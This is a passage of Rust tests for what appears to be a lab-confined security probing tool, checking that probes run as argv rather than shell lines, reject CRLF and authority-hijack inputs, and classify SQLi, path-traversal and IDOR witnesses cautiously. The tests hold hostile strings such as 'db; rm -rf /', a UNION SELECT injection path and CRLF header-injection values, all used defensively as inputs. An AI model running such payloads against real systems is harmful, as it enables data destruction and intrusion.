            .boundary("a", "b", &[])
            .boundary("b", "a", &[])
            .build()
            .expect("valid");
        let two = lab(
            vec![net("a", "n-a"), net("b", "n-b")],
            vec![container("wa", "a", "c-wa"), container("wb", "b", "c-wb")],
        );
        // Controls reach each workload on its own net; the b -> a forbidden path
        // (the second boundary) is reachable, the a -> b one is not.
        let prober = MockProber::new()
            .reach("n-b", "c-wb")
            .reach("n-a", "c-wa")
            .reach("n-b", "c-wa");
        let result = block_on(check_boundaries(&env, &two, &prober));
        assert!(
            matches!(&result, Err(Error::BoundaryViolated { from, to }) if from == "b" && to == "a"),
            "got {result:?}"
        );
    }

    /// Guard: `nc_result` reads exit 0 as a completed connect, exit 1 as
    /// indeterminate (busybox `nc` cannot surface a refusal), and any other code
    /// or an abnormal probe fails closed rather than reading as a clean
    /// "unreachable" (CLAUDE.md row 6). Mutation: the exit-1 arm to `Connected`
    /// -> an unreachable target reads as reachable -> this fails; the `other =>
    /// Err` arm to `Ok(Indeterminate)` -> a crashed probe reads as a clean
    /// not-reachable -> the Err assertion fails.
    #[test]
    fn nc_result_reads_a_finished_probe_and_fails_closed() {
        use bollard::models::ContainerStateStatusEnum::{CREATED, EXITED};
        let state = |status, code| ContainerState {
            status,
            exit_code: code,
            ..Default::default()
        };
        assert_eq!(
            nc_result(&state(Some(EXITED), Some(0))).unwrap(),
            ConnectOutcome::Connected
        );
        assert_eq!(
            nc_result(&state(Some(EXITED), Some(1))).unwrap(),
            ConnectOutcome::Indeterminate
        );
        for abnormal in [
            state(Some(EXITED), Some(137)), // crashed / OOM-killed
            state(Some(EXITED), None),      // exited without a code
            state(Some(CREATED), Some(0)),  // never ran
        ] {
            assert!(
                matches!(nc_result(&abnormal), Err(Error::LabUnavailable { .. })),
                "an abnormal probe must fail closed: {:?}",
                abnormal.status
            );
        }
    }

    /// Guard: the vantage probe command is argv run directly, never a shell line,
    /// so a crafted host or port cannot inject a command into the probe container.
    /// Mutation: build the command as `["sh", "-c", format!(...)]` -> the no-shell
    /// assertion fails; drop the host argument -> the host-is-one-argument
    /// assertion fails.
    #[test]
    fn nc_cmd_is_argv_not_a_shell_line() {
        let hostile = "db; rm -rf /";
        let cmd = nc_cmd(hostile, 5432, 2);
        assert_eq!(cmd[0], "nc", "the probe runs nc directly");
        assert!(
            !cmd.iter().any(|a| a == "sh" || a == "-c"),
            "no shell wrapper, got {cmd:?}"
        );
        assert!(
            cmd.contains(&hostile.to_owned()),
            "the host is one argument, not interpreted: {cmd:?}"
        );
        assert!(cmd.contains(&"5432".to_owned()) && cmd.contains(&"2".to_owned()));
    }

    /// Guard: `classify_probe` reads a clean ping outcome and fails closed on
    /// anything else. Mutation: change the `_ => Err` arm to `Ok(false)` -> the
    /// abnormal cases read as "blocked" -> the Err assertions fail; flip the
    /// `Some(0)`/`Some(1)` arms -> the reachable/blocked assertions fail.
    #[test]
    fn classify_probe_reads_clean_outcomes_and_fails_closed() {
        use bollard::models::ContainerStateStatusEnum::{CREATED, EXITED, RUNNING};
        let state = |status, code| ContainerState {
            status,
            exit_code: code,
            ..Default::default()
        };
        assert!(matches!(
            classify_probe(&state(Some(EXITED), Some(0))),
            Ok(true)
        ));
        assert!(matches!(
            classify_probe(&state(Some(EXITED), Some(1))),
            Ok(false)
        ));
        for abnormal in [
            state(Some(EXITED), Some(137)), // OOM-killed
            state(Some(EXITED), None),      // exited without a code
            state(Some(CREATED), Some(0)),  // never ran
            state(Some(RUNNING), Some(0)),  // not actually exited
            state(None, Some(0)),           // no status
        ] {
            assert!(
                matches!(classify_probe(&abnormal), Err(Error::LabUnavailable { .. })),
                "abnormal state must fail closed: {:?}",
                abnormal.status
            );
        }
    }

    /// Guard: `classify_http_witness` reads a captured HTTP witness probe. A followed redirect is
    /// `Low` even with the witness in the body, because the body may be from the
    /// redirect's host, not the target (#55). Else a clean exit (0) whose body
    /// carries the witness is exploited at `High`; a clean exit whose body lacks it
    /// is not-exploitable at `High`; any other code, or an unclean exit, is `Low`
    /// (value `false`) so it lands Inconclusive under the default gate, never a
    /// confident "not exploitable" (RK-002, CLAUDE.md row 6). Mutation: ignore the
    /// `redirected` argument -> a redirected witness body reads as a confident
    /// exploit -> the with-witness redirect assertion fails; restrict the downgrade
    /// to `redirected && body.contains(marker)` -> a redirected marker-less 200
    /// reads as a confident "not exploitable" from another host's page (row 6) ->
    /// the no-witness redirect assertion fails; give the abnormal arm `High` -> a
    /// connect failure reads as a confident clean -> the Low assertions fail (the
    /// row-6 guard); give clean-no-witness `Low` -> the fixed-target PASS path (#50
    /// beta) can never reach a confident Pass -> that assertion fails; drop the
    /// `body.contains` guard -> a clean 200 with no flag reads as exploited -> fails.
    #[test]
    fn classify_http_witness_reads_the_body_and_fails_closed() {
        use bollard::models::ContainerStateStatusEnum::{CREATED, EXITED};
        let state = |status, code| ContainerState {
            status,
            exit_code: code,
            ..Default::default()
        };
        let witness = "REDSTEP_SQLI_WITNESS_7F3A";

        let exploited = classify_http_witness(
            &state(Some(EXITED), Some(0)),
            "label|REDSTEP_SQLI_WITNESS_7F3A\n",
            witness,
            false,
        );
        assert!(exploited.value);
        assert_eq!(exploited.confidence, Confidence::High);

        let clean = classify_http_witness(
            &state(Some(EXITED), Some(0)),
            "welcome|hello\n",
            witness,
            false,
        );
        assert!(!clean.value);
        assert_eq!(clean.confidence, Confidence::High);

        // A followed redirect is Inconclusive even with the witness present and a
        // clean exit: the body is not provably the scoped target's (#55).
        let redirected = classify_http_witness(
            &state(Some(EXITED), Some(0)),
            "label|REDSTEP_SQLI_WITNESS_7F3A\n",
            witness,
            true,
        );
        assert!(!redirected.value);
        assert_eq!(redirected.confidence, Confidence::Low);

        // And without the witness: a redirected clean 200 must not read as a
        // confident "not exploitable" (that would be a confident verdict on another
        // host's page, row 6). The downgrade is unconditional on the body.
        let redirected_no_witness = classify_http_witness(
            &state(Some(EXITED), Some(0)),
            "welcome|hello\n",
            witness,
            true,
        );
        assert!(!redirected_no_witness.value);
        assert_eq!(redirected_no_witness.confidence, Confidence::Low);

        // A non-zero clean exit (HTTP error / connect failure) and an unclean exit
        // are both inconclusive, whatever the (empty) body: value false at Low.
        for abnormal in [
            state(Some(EXITED), Some(1)),   // wget error (connect/HTTP)
            state(Some(EXITED), Some(137)), // killed
            state(Some(EXITED), None),      // no code
            state(Some(CREATED), Some(0)),  // never ran
        ] {
            let obs = classify_http_witness(&abnormal, "", witness, false);
            assert!(!obs.value, "abnormal: {:?}", abnormal.status);
            assert_eq!(
                obs.confidence,
                Confidence::Low,
                "an abnormal probe is Low, not a confident not-exploitable: {:?}",
                abnormal.status
            );
        }
    }

    /// Guard: `response_was_redirected` fires on a 3xx *status line* anywhere in
    /// the `wget -S` headers, and on nothing else (#55). Every followed-redirect
    /// code (301/302/303/307/308) is a hit; a 2xx/4xx/5xx status, a 3xx that
    /// appears only in a header value, and an empty block are misses. The first
    /// block is a real busybox `-S` stderr. Pure, no Docker. Mutations, each caught
    /// by a row: `starts_with('3')` -> `contains('3')` (a 203 hits) or
    /// `!starts_with('2')` (a 404 hits) or `== "302"` (301/307/308 miss); drop
    /// .strip_prefix("HTTP/")` (the `Content-Length: 300` header value hits);
    /// `lines()` -> `lines().take(1)` (the status line not on the first line is
    /// missed).
    #[test]
    fn response_was_redirected_detects_a_3xx_status_line() {
        let redirected: &[&str] = &[
            "  HTTP/1.0 302 Found\n  Location: http://other/\n  HTTP/1.1 200 OK\n  Content-Length: 14\n",
            "  HTTP/1.1 301 Moved Permanently\n  HTTP/1.1 200 OK\n",
            "  HTTP/1.1 307 Temporary Redirect\n  HTTP/1.1 200 OK\n",
            "  HTTP/1.1 308 Permanent Redirect\n  HTTP/1.1 200 OK\n",
            // busybox prints a "Connecting to ..." line before the status line, so
            // the 3xx is not always the first line: every line must be scanned.
            "Connecting to redir (10.0.0.2:80)\n  HTTP/1.1 302 Found\n  HTTP/1.1 200 OK\n",
        ];
        let direct: &[&str] = &[
            "  HTTP/1.1 200 OK\n  Content-Length: 14\n",
            "  HTTP/1.1 203 Non-Authoritative Information\n",
            "  HTTP/1.1 404 Not Found\n",
            "  HTTP/1.1 500 Internal Server Error\n",
            // a 3xx only in a header value, never a status line, is not a redirect.
            "  HTTP/1.1 200 OK\n  Content-Length: 300\n",
            "",
        ];
        for h in redirected {
            assert!(
                response_was_redirected(h),
                "should detect a redirect: {h:?}"
            );
        }
        for h in direct {
            assert!(!response_was_redirected(h), "should not flag: {h:?}");
        }
    }

    /// Guard (Docker; self-skips without a Linux daemon): a target that answers
    /// with a redirect yields an Inconclusive (`Low`) observation, not a confident
    /// exploit attributed to the scoped target, even though the redirected body
    /// carries the marker (#55). `redir` 302s to `t2`, which serves a body
    /// containing the marker; the same busybox `wget -S` the probe uses follows
    /// the redirect, so `response_was_redirected` sees the 3xx and `classify_http_witness`
    /// downgrades. The services carry no healthcheck (ready at once), so a bounded
    /// readiness loop waits for the whole chain (clean exit + marker fetched +
    /// redirect seen) before the measured probe, so a connect race cannot
    /// masquerade as the downgrade. Mutation: make `classify_http_witness` ignore
    /// `redirected` -> `http_witness_exploit_from` reads `true`/`High` attributed to
    /// `redir` -> this fails.
    #[test]
    fn a_redirecting_target_is_inconclusive_not_a_confident_exploit() {
        if !linux_docker_available() {
            eprintln!(
                "skipping a_redirecting_target_is_inconclusive_not_a_confident_exploit: no Linux Docker daemon"
            );
            return;
        }
        const MARKER: &str = "REDIRECTEDBODYMARKER55";
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            pull_image(&docker, PROBE_IMAGE)
                .await
                .expect("pull the probe image");
            let env = Environment::builder()
                .segment("lab")
                .vantage("lab")
                .service_cmd(
                    "redir",
                    PROBE_IMAGE,
                    "lab",
                    &[
                        "sh",
                        "-c",
                        "while true; do printf 'HTTP/1.0 302 Found\\r\\nLocation: http://t2/\\r\\nContent-Length: 0\\r\\n\\r\\n' | nc -l -p 80; done",
                    ],
                )
                .service_cmd(
                    "t2",
                    PROBE_IMAGE,
                    "lab",
                    &[
                        "sh",
                        "-c",
                        "mkdir -p /www && printf '%s\\n' REDIRECTEDBODYMARKER55 > /www/index.html && httpd -f -h /www -p 80",
                    ],
                )
                .build()
                .expect("the redirector environment is valid");
            let lab = bring_up(&docker, &env)
                .await
                .expect("bring up the redirector lab");
            let net = vantage_network(&lab, "lab").expect("the lab network");
            let scope = Scope::from_environment(&env);
            let target = scope.resolve("redir:80").expect("redir is in scope");
            let url = format!("http://{}:{}/", target.host(), target.port());

            // The services are healthcheck-less, so bring_up returns before nc/httpd
            // bind. Wait for the whole chain: a clean fetch of t2's body through the
            // redirect, so the measured probe below cannot pass via a connect race.
            let mut ready = false;
            for _ in 0..20 {
                let chain_up = run_probe_capturing(
                    &docker,
                    net.name(),
                    wget_cmd(&url, 3, &[]),
                    Duration::from_secs(8),
                )
                .await
                .is_ok_and(|(state, body, headers)| {
                    matches!(finished_exit_code(&state), Ok(0))
                        && body.contains(MARKER)
                        && response_was_redirected(&headers)
                });
                if chain_up {
                    ready = true;
                    break;
                }
            }
            assert!(ready, "the redirect chain (redir 302 -> t2 body) came up");

            let (observation, _draft) = http_witness_exploit_from(
                &docker,
                net,
                &target,
                "http_sqli_vantage",
                "/",
                MARKER,
                &[],
                Duration::from_secs(5),
            )
            .await
            .expect("the probe ran");
            let _ = lab.teardown().await;

            assert!(
                !observation.value,
                "a redirected body must not read as an exploit, got {observation:?}"
            );
            assert_eq!(
                observation.confidence,
                Confidence::Low,
                "a redirecting target is Inconclusive, not a confident answer, got {observation:?}"
            );
        });
    }

    /// Guard: `validate_http_request` fails closed on inputs that could change the
    /// request authority or forge the witness. A `request_path` not starting with
    /// `/` is refused (it could carry an `@authority` wget would connect to instead
    /// of the `ScopedTarget`); CR/LF in the path is refused; an empty marker is
    /// refused (`body.contains("")` is always true, a false exploit); a marker that
    /// appears in the path is refused (a reflected path could forge the witness). A
    /// valid request passes. Pure, no Docker. Mutation: drop the `starts_with('/')`
    /// check -> `@evil/x` passes -> the authority-hijack case fails; drop the empty
    /// check -> `""` passes -> the empty-marker case fails; drop the contains(marker)
    /// check -> the reflected case fails. Mutation: weaken the marker check back to
    /// `marker.is_empty()` -> the whitespace-only `" "` marker passes -> that case
    /// fails (a `" "` marker reads almost any 200 as exploited). A header is refused
    /// unless its name is an RFC 7230 token and its value has no control character,
    /// and the marker is refused in a header name or value (#64). Mutations: drop
    /// the per-header loop, or weaken it to `.take(1)`, or drop the token-name check,
    /// a single CR/LF sub-check, the control-in-value check, or the marker-in-name
    /// check -> the matching header case passes -> it fails.
    #[test]
    fn validate_http_request_fails_closed() {
        // Valid: a leading-slash path with a marker not in it, and a benign header.
        assert!(
            validate_http_request(
                "/lookup?name=' UNION SELECT flag--",
                "FLAG123",
                &[("Authorization".to_owned(), "tok-alice".to_owned())]
            )
            .is_ok()
        );

        let rejected = |path: &str, marker: &str| {
            matches!(
                validate_http_request(path, marker, &[]),
                Err(Error::InvalidTarget { .. })
            )
        };
        // A header is refused on the same injection/forgery grounds as the path.
        let rejected_header = |name: &str, value: &str| {
            matches!(
                validate_http_request("/lookup", "FLAG123", &[(name.to_owned(), value.to_owned())]),
                Err(Error::InvalidTarget { .. })
            )
        };
        // The authority hijack: `@evil/x` does not start with '/', so `http://host:port@evil/x`
        // cannot be built; wget connects to the ScopedTarget's host:port only.
        assert!(
            rejected("@evil/x", "FLAG123"),
            "an @authority path is refused"
        );
        assert!(
            rejected("lookup", "FLAG123"),
            "a path with no leading slash is refused"
        );
        assert!(
            rejected("/x\r\nHost: evil", "FLAG123"),
            "CRLF in the path is refused"
        );
        assert!(rejected("/lookup", ""), "an empty marker is refused");
        assert!(
            rejected("/lookup", "   "),
            "a whitespace-only marker is refused (body.contains(\" \") would match almost any 200)"
        );
        assert!(
            rejected("/lookup?name=FLAG123", "FLAG123"),
            "a marker appearing in the path is refused"
        );
        assert!(
            rejected_header("X-Evil", "a\r\nX-Injected: 1"),
            "a header value with CRLF is refused (it could inject another header)"
        );
        assert!(
            rejected_header("X-Bad\r\nHost", "evil"),
            "a header name with CRLF is refused"
        );
        assert!(
            rejected_header("Has:Colon", "v"),
            "a header name with ':' is refused (it would split the name)"
        );
        assert!(
            rejected_header("   ", "v"),
            "a whitespace (non-token) header name is refused"
        );
        assert!(
            rejected_header("X-Reflect", "FLAG123"),
            "the marker in a header value is refused (a reflected header could forge the witness)"
        );
        // Each CR and LF, in a name and a value, is refused on its own (the earlier
        // cases pair them), so bare-CR and bare-LF header injection is caught.
        assert!(
            rejected_header("X", "a\rb"),
            "a bare CR in a header value is refused"
        );
        assert!(
            rejected_header("X", "a\nb"),
            "a bare LF in a header value is refused"
        );
        assert!(
            rejected_header("X\rY", "v"),
            "a bare CR in a header name is refused"
        );
        assert!(
            rejected_header("X\nY", "v"),
            "a bare LF in a header name is refused"
        );
        // A non-token name: a leading space (an obs-fold vector) or an internal space.
        assert!(
            rejected_header(" X", "v"),
            "a header name with a leading space is refused"
        );
        assert!(
            rejected_header("X Y", "v"),
            "a header name with an internal space is refused"
        );
        // Any control byte in a value, not only CR/LF.
        assert!(
            rejected_header("X", "a\u{0}b"),
            "a NUL in a header value is refused"
        );
        // The marker in a header NAME is refused too, not only in a value.
        assert!(
            rejected_header("X-FLAG123", "v"),
            "the marker in a header name is refused"
        );
        // The loop checks every header, not just the first: a hostile SECOND header
        // (so a `.take(1)` mutation would skip it) is refused.
        assert!(
            matches!(
                validate_http_request(
                    "/lookup",
                    "FLAG123",
                    &[
                        ("Good".to_owned(), "v".to_owned()),
                        ("X".to_owned(), "a\r\nInjected: 1".to_owned()),
                    ],
                ),
                Err(Error::InvalidTarget { .. })
            ),
            "a hostile second header is refused (the loop checks every header)"
        );
    }

    /// Guard: the SQLi probe command is the exact argv
    /// `wget -q -S -T <secs> -O - <url>`, run directly (never a shell line), so a
    /// crafted URL cannot inject a command and the quiet/headers/timeout/stdout
    /// flags are what the capture and redirect-detection paths rely on. Mutation:
    /// build it as `["sh", "-c", ...]`, drop `-q` or `-S`, change the `-T` value,
    /// or change `-O -` to a file -> the whole-argv assertion fails. A header is a
    /// `--header` option with its `"name: value"` as one argument before the url
    /// (#64); mutation: fold the header into the url or drop the `--header` -> the
    /// header-case assertion fails.
    #[test]
    fn wget_cmd_is_argv_not_a_shell_line() {
        let url = "http://web:8080/lookup?name='; rm -rf /";
        let cmd = wget_cmd(url, 5, &[]);
        assert_eq!(
            cmd,
            vec![
                "wget".to_owned(),
                "-q".to_owned(),
                "-S".to_owned(),
                "-T".to_owned(),
                "5".to_owned(),
                "-O".to_owned(),
                "-".to_owned(),
                url.to_owned(),
            ],
            "the probe is wget argv with the quiet/headers/timeout/stdout flags and the url as one argument"
        );
        // Two headers each become `--header` + one `name: value` argument, in order,
        // before the url. Two (not one) so a `.take(1)` over the loop is caught.
        let with_headers = wget_cmd(
            "http://api:8081/object?id=2",
            5,
            &[
                ("Authorization".to_owned(), "tok-alice".to_owned()),
                ("X-Tenant".to_owned(), "acme".to_owned()),
            ],
        );
        assert_eq!(
            with_headers,
            vec![
                "wget".to_owned(),
                "-q".to_owned(),
                "-S".to_owned(),
                "-T".to_owned(),
                "5".to_owned(),
                "-O".to_owned(),
                "-".to_owned(),
                "--header".to_owned(),
                "Authorization: tok-alice".to_owned(),
                "--header".to_owned(),
                "X-Tenant: acme".to_owned(),
                "http://api:8081/object?id=2".to_owned(),
            ],
            "each header is a --header option with 'name: value' as one argument before the url"
        );
        assert!(
            !cmd.iter().any(|a| a == "sh" || a == "-c"),
            "no shell wrapper, got {cmd:?}"
        );
    }

    /// Guard: `parse_image_ref` reads a tag, a bare name, a registry `host:port`,
    /// and an `@sha256:...` digest into the right `(from_image, tag)` pair (#48).
    /// Pure, no Docker, so it runs on every gate. Mutation: revert the body to
    /// `image.rsplit_once(':')` over the whole reference -> `localhost:5000/app`
    /// parses to `("localhost", "5000/app")` and `repo@sha256:abcd` to
    /// `("repo@sha256", "abcd")` -> the registry-port and digest cases fail.
    #[test]
    fn parse_image_ref_reads_a_tag_registry_port_and_digest() {
        assert_eq!(parse_image_ref("postgres:16"), ("postgres", "16"));
        assert_eq!(parse_image_ref("busybox:1.37"), ("busybox", "1.37"));
        assert_eq!(parse_image_ref("redis"), ("redis", "latest"));
        assert_eq!(parse_image_ref("redstep/api:mvp"), ("redstep/api", "mvp"));
        assert_eq!(
            parse_image_ref("localhost:5000/app"),
            ("localhost:5000/app", "latest"),
            "a registry host:port before the path is not a tag"
        );
        assert_eq!(
            parse_image_ref("localhost:5000/app:v1"),
            ("localhost:5000/app", "v1"),
            "a tag after a registry host:port is still read"
        );
        assert_eq!(
            parse_image_ref("repo@sha256:abcd"),
            ("repo", "sha256:abcd"),
            "a digest goes to the tag field whole, name is what precedes the @"
        );
    }

    /// Guard: `is_local_only_image` is true for exactly the project's own
    /// `redstep/*` fixtures and false for a registry image (#53). This is the
    /// offline anchor for the refusal-to-pull safety rule, which `ensure_image`'s
    /// Docker-gated test only wires up (RK-014). Mutation: `starts_with(..)` ->
    /// `false` makes the `redstep/*` cases fail; -> `true` makes the
    /// busybox/postgres cases fail; drop the `/` from `LOCAL_IMAGE_PREFIX`
    /// (`"redstep/"` -> `"redstep"`) and the `redstepper/x` case fails, because
    /// the boundary is the `redstep/` namespace, not a bare `redstep` prefix.
    #[test]
    fn is_local_only_image_is_true_only_for_the_project_prefix() {
        assert!(is_local_only_image("redstep/db:mvp"));
        assert!(is_local_only_image("redstep/api:fixed"));
        assert!(is_local_only_image("redstep/web:mvp"));
        assert!(!is_local_only_image("busybox:1.37"));
        assert!(!is_local_only_image("postgres:16"));
        assert!(
            !is_local_only_image("docker.io/redstep/x:1"),
            "a registry-qualified name is not the project's unqualified fixture form"
        );
        assert!(
            !is_local_only_image("redstepper/x:1"),
            "the boundary is the redstep/ namespace, not a bare redstep prefix"
        );
    }

    /// Guard (Docker; self-skips without a Linux daemon): `ensure_image` refuses
    /// an absent local-only fixture with a `playground/build.sh` hint that names
    /// the fixture, rather than reaching a registry (#53). Needs no built image:
    /// it names a fixture that is deliberately never built. Mutation: remove the
    /// `is_local_only_image` branch in `ensure_image` -> it falls to `pull_image`
    /// and the error is a registry pull failure, not the build hint -> this
    /// fails; drop `{image}` from the hint -> the fixture-name assertion fails.
    /// The rule itself is pinned offline by
    /// `is_local_only_image_is_true_only_for_the_project_prefix`.
    #[test]
    fn ensure_image_refuses_to_pull_an_absent_local_only_image() {
        if !linux_docker_available() {
            eprintln!(
                "skipping ensure_image_refuses_to_pull_an_absent_local_only_image: no Linux Docker daemon"
            );
            return;
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let err = ensure_image(&docker, "redstep/absent-fixture:test")
                .await
                .expect_err("an absent local-only image must not resolve to a pull");
            match err {
                Error::LabUnavailable { reason } => {
                    assert!(
                        reason.contains("playground/build.sh"),
                        "the refusal points at the build script, got: {reason:?}"
                    );
                    assert!(
                        reason.contains("redstep/absent-fixture:test"),
                        "the refusal names which fixture to build, got: {reason:?}"
                    );
                }
                other => panic!("expected LabUnavailable with a build hint, got {other:?}"),
            }
        });
    }

    /// Guard (Docker; self-skips without a Linux daemon): an absent image that is
    /// NOT a local-only fixture reaches `pull_image` rather than the refusal (the
    /// else arm, #53 AC 2: a registry image still pulls). The name uses the
    /// reserved `.invalid` TLD, so the pull fails fast on an unresolvable host
    /// with no real egress (verified: ~0.3s, "no such host"), and the error is a
    /// pull failure, not the `playground/build.sh` hint. Mutation: replace the
    /// final `pull_image(...).await` in `ensure_image` with `Ok(())` -> this image
    /// resolves to `Ok` and the `expect_err` panics -> this fails.
    #[test]
    fn ensure_image_pulls_an_absent_non_local_image() {
        if !linux_docker_available() {
            eprintln!(
                "skipping ensure_image_pulls_an_absent_non_local_image: no Linux Docker daemon"
            );
            return;
        }
        block_on(async {
            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
            let err = ensure_image(&docker, "redstep-nonexistent.invalid/x:1")
                .await
                .expect_err("an unresolvable registry image must fail the pull");
            match err {
                Error::LabUnavailable { reason } => assert!(
                    !reason.contains("playground/build.sh"),
                    "a non-local image must hit the pull, not the build hint, got: {reason:?}"
                ),
                other => panic!("expected a pull failure as LabUnavailable, got {other:?}"),
            }
        });
    }

    /// Guard: `http_witness_draft` mirrors the observation into the record (RK-011) and
    /// carries a replay-sufficient, self-contained reproduction (capability,
    /// target, request path, marker, stable segment, timeout), with an honest
    /// `Controlled` intensity and a summary that never overclaims. Pure, no Docker.
    /// Mutation: hard-code `observed: Bool(true)` or `confidence: High` -> the
    /// not-exploitable/Low cases' assertions fail; alter the target, `timeout_ms`,
    /// capability, intensity, or the Low summary -> the matching assertion fails;
    /// set `source: None` -> the source assertion fails.
    #[test]
    fn http_witness_draft_mirrors_the_observation_and_carries_the_witness() {
        let exploited = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let draft = http_witness_draft(
            "http_sqli_vantage",
            "lab",
            "web:8080".to_owned(),
            "/lookup?name=payload",
            "FLAG123",
            &[],
            &exploited,
            Duration::from_secs(5),
        );
        assert_eq!(draft.capability, "http_sqli_vantage");
        assert_eq!(draft.target, "web:8080");
        assert_eq!(draft.intensity, Intensity::Controlled);
        assert_eq!(draft.observed, serde_json::Value::Bool(true));
        assert_eq!(draft.confidence, Confidence::High);
        assert_eq!(
            draft.source,
            Some(NodeRef::Vantage {
                segment: "lab".to_owned()
            })
        );
        assert_eq!(draft.reproduction.capability, "http_sqli_vantage");
        assert_eq!(draft.reproduction.target, "web:8080");
        assert_eq!(
            draft.reproduction.params["request_path"].as_str(),
            Some("/lookup?name=payload")
        );
        assert_eq!(
            draft.reproduction.params["marker"].as_str(),
            Some("FLAG123")
        );
        assert_eq!(
            draft.reproduction.params["vantage_segment"].as_str(),
            Some("lab")
        );
        assert_eq!(
            draft.reproduction.params["timeout_ms"].as_u64(),
            Some(5000),
            "the applied timeout is recorded for a faithful replay"
        );
        assert_eq!(
            draft.summary, "the response carried the marker \"FLAG123\"; the attack succeeded",
            "the exploited summary is pinned exact, capability-neutral, and names the marker"
        );
        assert!(
            draft.reproduction.params.get("request_headers").is_none(),
            "a draft with no request headers omits the key, so the SQLi/traversal canonical-JSON shape is unchanged (RK-003)"
        );

        // The not-exploitable observation is mirrored too (the decisive case a
        // hard-coded `true` would hide), and its summary does not overclaim.
        let clean = Observation {
            value: false,
            confidence: Confidence::High,
        };
        let draft = http_witness_draft(
            "http_sqli_vantage",
            "lab",
            "web:8080".to_owned(),
            "/lookup?name=welcome",
            "FLAG123",
            &[],
            &clean,
            Duration::from_secs(5),
        );
        assert_eq!(draft.observed, serde_json::Value::Bool(false));
        assert_eq!(draft.confidence, Confidence::High);
        assert_eq!(
            draft.summary,
            "the response did not carry the marker \"FLAG123\"; this request did not exploit it",
            "the clean summary is pinned exact and scoped to this request, not a universal claim"
        );
        assert!(
            !draft.summary.contains("succeeded"),
            "a non-exploit summary never claims success: {:?}",
            draft.summary
        );

        // An inconclusive (abnormal) probe: value false at Low, and the summary
        // must say inconclusive, not a clean negative (an abnormal probe did not
        // establish the endpoint's state, RK-002). Mutation: mirror `confidence` as
        // a constant High, or give the Low branch the clean-negative summary -> fail.
        let inconclusive = Observation {
            value: false,
            confidence: Confidence::Low,
        };
        let draft = http_witness_draft(
            "http_sqli_vantage",
            "lab",
            "web:8080".to_owned(),
            "/lookup?name=welcome",
            "FLAG123",
            &[],
            &inconclusive,
            Duration::from_secs(5),
        );
        assert_eq!(draft.confidence, Confidence::Low);
        assert_eq!(
            draft.summary, "the probe did not complete cleanly; the result is inconclusive",
            "the Low summary is inconclusive, pinned exact, not a clean negative (RK-002)"
        );
        assert!(
            !draft.summary.contains("succeeded"),
            "an inconclusive summary never claims success: {:?}",
            draft.summary
        );
    }

    /// Guard: the seam writes the caller's `capability` into both the draft and its
    /// reproduction, so a second technique's evidence is tagged as itself and a
    /// replay reconstructs the right technique (not the SQLi one). The summary stays
    /// capability-neutral across techniques. Pure, no Docker. Mutation: hard-code
    /// either `capability` field back to "http_sqli_vantage" in `http_witness_draft`
    /// -> the path-traversal capability assertions fail.
    #[test]
    fn http_witness_draft_carries_the_given_capability() {
        let exploited = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let draft = http_witness_draft(
            "http_path_traversal_vantage",
            "lab",
            "api:8081".to_owned(),
            "/file?path=..%2fsecret.txt",
            "SENTINEL42",
            &[],
            &exploited,
            Duration::from_secs(5),
        );
        assert_eq!(draft.capability, "http_path_traversal_vantage");
        assert_eq!(draft.reproduction.capability, "http_path_traversal_vantage");
        // The summary is the shared neutral wording, not a SQLi-specific one.
        assert!(
            draft.summary.contains("the attack succeeded") && draft.summary.contains("SENTINEL42"),
            "the summary is capability-neutral and names the witness: {:?}",
            draft.summary
        );
        assert!(
            !draft.summary.contains("injection"),
            "the neutral summary does not name a specific technique: {:?}",
            draft.summary
        );
    }

    /// Guard: request headers (the IDOR identity, #64) round-trip through the draft's
    /// reproduction and back out of `parse_http_witness`, so a replay re-sends the
    /// same identity, and the IDOR witness resolves to its own capability (not the
    /// SQLi one). Two headers, so a `.take(1)` over either loop is caught. Pure, no
    /// Docker. Mutations: drop the `if !request_headers.is_empty()` serialization in
    /// `http_witness_draft` -> no `request_headers` key -> the draft assertion fails;
    /// drop the headers parse in `parse_http_witness` -> empty -> the round-trip fails;
    /// `.take(1)` either loop -> the second header is lost -> fails; map the
    /// `HTTP_IDOR_VANTAGE` parse arm to `HTTP_SQLI_VANTAGE` -> the capability assertion
    /// fails.
    #[test]
    fn http_witness_draft_and_parse_round_trip_request_headers() {
        let exploited = Observation {
            value: true,
            confidence: Confidence::High,
        };
        let headers = [
            ("Authorization".to_owned(), "tok-alice".to_owned()),
            ("X-Tenant".to_owned(), "acme".to_owned()),
        ];
        let draft = http_witness_draft(
            HTTP_IDOR_VANTAGE,
            "lab",
            "api:8081".to_owned(),
            "/object?id=2",
            "REDSTEP_IDOR",
            &headers,
            &exploited,
            Duration::from_secs(5),
        );
        assert_eq!(
            draft.reproduction.params["request_headers"],
            serde_json::json!([["Authorization", "tok-alice"], ["X-Tenant", "acme"]]),
            "the request headers are recorded in the reproduction, in order, for a faithful replay"
        );
        let (cap, _seg, _target, _path, _marker, parsed_headers, _timeout) =
            parse_http_witness(&draft.reproduction).expect("the IDOR witness parses");
        assert_eq!(
            cap, "http_idor_vantage",
            "the IDOR witness resolves to its own capability, not SQLi's"
        );
        assert_eq!(
            parsed_headers,
            vec![
                ("Authorization".to_owned(), "tok-alice".to_owned()),
                ("X-Tenant".to_owned(), "acme".to_owned()),
            ],
            "parse_http_witness reads every identity header back out of the witness"
        );
    }

    /// The lab tests default to SKIPPED and run only when `REDSTEP_RUN_DOCKER_TESTS`
    /// is set, so a local `cargo test` creates no lab containers; CI opts in. When
    /// the opt-in is set, the daemon MUST be present and in Linux-container mode (a
    /// Windows-container daemon reports success for `docker info` but cannot run the
    /// lab), and its absence is a loud `assert!` failure, not a skip: a silent skip
    /// in CI would leave the Docker-gated guards (the exploit/fix/replay loops, the
    /// boundary self-check) unrun while CI stayed green, the worse of the two (a
    /// guard that does not run is worse than a visibly failing one).
    /// (Mirrors the gate in `tests/environment.rs`.)
    fn linux_docker_available() -> bool {
        if std::env::var_os("REDSTEP_RUN_DOCKER_TESTS").is_none() {
            return false;
        }
        let present = std::process::Command::new("docker")
            .args(["info", "--format", "{{.OSType}}"])
            .output()
            .map(|o| o.status.success() && String::from_utf8_lossy(&o.stdout).trim() == "linux")
            .unwrap_or(false);
        assert!(
            present,
            "REDSTEP_RUN_DOCKER_TESTS is set but no Linux-container Docker daemon is \
             available; the lab tests cannot run (unset it to skip them locally)"
        );
